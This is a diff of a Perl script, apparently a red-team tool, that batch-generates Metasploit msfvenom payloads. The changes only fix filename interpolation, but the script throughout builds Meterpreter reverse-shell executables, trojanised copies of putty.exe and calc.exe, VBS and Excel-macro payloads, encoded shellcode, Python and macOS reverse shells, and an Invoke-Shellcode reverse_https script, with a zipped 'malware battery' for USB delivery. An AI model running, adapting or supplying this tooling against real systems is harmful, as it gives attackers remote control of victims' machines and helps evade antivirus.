@@ -38,21 +38,21 @@ use warnings;
   ##################
 
   `touch $targetFolder/000-StartMSF900.cue`; 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-$PROJECT-$PROJECTNUM-BasicMeterpreter-32.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-$PROJECT-$PROJECTNUM-Meterpreter-packed-putty-32.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-putty-32.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
   
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-$PROJECT-$PROJECTNUM-Meterpreter-32.vbs";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-${PROJECT}-${PROJECTNUM}-Meterpreter-32.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-$PROJECT-$PROJECTNUM-Meterpreter-32.vba";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-${PROJECT}-${PROJECTNUM}-Meterpreter-32.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
@@ -65,17 +65,17 @@ use warnings;
 
   $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-$PROJECT-$PROJECTNUM-BasicMeterpreter-32enc.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-$PROJECT-$PROJECTNUM-Meterpreter-packed-putty-32enc.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-putty-32enc.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
 
-   $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-$PROJECT-$PROJECTNUM-Meterpreter-32enc.vbs";
+   $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-${PROJECT}-${PROJECTNUM}-Meterpreter-32enc.vbs";
    print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
@@ -83,11 +83,11 @@ use warnings;
   #tuning encoder down to 1 for VBA
   #consistently had issues with this running.
   $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-$PROJECT-$PROJECTNUM-Meterpreter-32enc.vba";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-${PROJECT}-${PROJECTNUM}-Meterpreter-32enc.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
-  `touch $targetFolder/050-$PROJECT-$PROJECTNUM-RepeatWith905.cue`;
+  `touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;
 
 
 
@@ -104,21 +104,21 @@ use warnings;
   
   `touch $targetFolder/100-StartMSF910.cue`; 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/101-$PROJECT-$PROJECTNUM-BasicMeterpreter-64.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/101-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/102-$PROJECT-$PROJECTNUM-Meterpreter-packed-calc-64.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/102-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/103-$PROJECT-$PROJECTNUM-Meterpreter-64.vbs";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/103-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/104-$PROJECT-$PROJECTNUM-Meterpreter-64.vba";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/104-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
@@ -130,36 +130,36 @@ use warnings;
 
   $encoder ='-e x64/xor -i 3';
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-$PROJECT-$PROJECTNUM-BasicMeterpreter-64enc.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64enc.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-$PROJECT-$PROJECTNUM-Meterpreter-packed-calc-64enc.exe";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64enc.exe";
   print "\n\n*** Meterpreter packed into putty: $cmd \n";
   `$cmd`;
 
 
-  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-$PROJECT-$PROJECTNUM-Meterpreter-64enc.vbs";
+  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-$PROJECT-$PROJECTNUM-Meterpreter-64enc.vba";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-$PROJECT-$PROJECTNUM-CShellCode-64enc.c";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
   print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
   `$cmd`;
-  `cp ./inc/meterpreter_x64.c $targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterTemplate.c`;
-  `echo "#!/bin/sh" >$targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterGen.sh`;
-  `echo "x86_64-w64-mingw32-gcc 115-$PROJECT-$PROJECTNUMMeterpreterTemplate.c  -o 115-$PROJECT-$PROJECTNUM-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterGen.sh`;
-  `chmod +x i$targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterGen.sh`;
+  `cp ./inc/meterpreter_x64.c $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c`;
+  `echo "#!/bin/sh" >$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
+  `echo "x86_64-w64-mingw32-gcc 115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c  -o 115-${PROJECT}-${PROJECTNUM}-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
+  `chmod +x i$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
 
   #Original: msfvenom --platform win -ax86_64 -e x64/xor -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 -f c >shellcode.c 2>&1
 
-  `touch $targetFolder/150-$PROJECT-$PROJECTNUM-RepeatWith915.cue`;
+  `touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;
 
 
 
@@ -172,7 +172,7 @@ use warnings;
     print "Installing PowerSploit now in /opt/ \n";
     `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
   }
-  `touch $targetFolder/200-$PROJECT-$PROJECTNUM-Run950.cue`;
+  `touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
   my ($ShellCodePath) ="./701_Invoke-Shellcode.ps1";
   `cp $ShellCodePath $targetFolder/701_Invoke-Shellcode.ps1`;
   `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/701_Invoke-Shellcode.ps1`;
@@ -181,8 +181,8 @@ use warnings;
   print $OUTFILE $cmd;
   close $OUTFILE;
 
-  `touch $targetFolder/300-$PROJECT-$PROJECTNUM-run960.cue`;
-  `touch $targetFolder/300-$PROJECT-$PROJECTNUM-run965.cue`;
+  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run960.cue`;
+  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run965.cue`;
 
 
   ###################
@@ -191,15 +191,15 @@ use warnings;
   ##
   ##################
  
- `touch $targetFolder/400-$PROJECT-$PROJECTNUM-run970.cue`;
+ `touch $targetFolder/400-${PROJECT}-${PROJECTNUM}-run970.cue`;
 
   $platform_arch = "--platform Python -a python";
   $encoder = "-e generic/none";
   $payload = "-p python/meterpreter/reverse_tcp";
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/401-$PROJECT-$PROJECTNUM-Meterpreter-python.py";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/401-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
   print "\n\n*** Meterpreter python: $cmd\n";
   `$cmd`;
-  #original: msfvenom -e generic/none --platform Python -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 >400-$PROJECT-$PROJECTNUM-Python.py
+  #original: msfvenom -e generic/none --platform Python -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 >400-${PROJECT}-${PROJECTNUM}-Python.py
 
 
 
@@ -209,12 +209,12 @@ use warnings;
   ##
   ##################
 
- `touch $targetFolder/500-$PROJECT-$PROJECTNUM-run975.cue`;
+ `touch $targetFolder/500-${PROJECT}-${PROJECTNUM}-run975.cue`;
 
   $platform_arch = "--platform OSX -a x86";
   $encoder = '-e generic/none -b "\x00"';
   $payload = "-p osx/x86/shell_reverse_tcp";
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/501-$PROJECT-$PROJECTNUM-shell.macho";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/501-${PROJECT}-${PROJECTNUM}-shell.macho";
   print "\n\n*** Meterpreter mac: $cmd\n";
   `$cmd`;
 
@@ -242,7 +242,7 @@ use warnings;
   ##  zip it up for USB/Download fast transfer
   ##
   ##################
-#  `zip -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip $targetFolder/*`;
+#  `zip -r $targetFolder/999-${PROJECT}-${PROJECTNUM}-Malware-CurrentBattery.zip $targetFolder/*`;
 
 
 
